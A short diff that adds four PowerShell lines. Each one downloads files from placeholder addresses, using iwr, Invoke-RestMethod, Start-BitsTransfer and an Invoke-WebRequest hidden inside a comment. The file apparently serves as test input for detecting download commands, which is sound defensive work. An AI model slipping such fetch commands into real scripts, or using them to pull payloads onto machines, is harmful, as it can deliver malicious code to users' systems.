@@ -1,0 +1,4 @@
+iwr -Uri 'http://192.0.2.7/x' -OutFile x; Invoke-RestMethod $u
+$u = 'https://example.org/y'
+Start-BitsTransfer -Source http://192.0.2.8/z -Destination z
+<# Invoke-WebRequest http://192.0.2.9/c #>
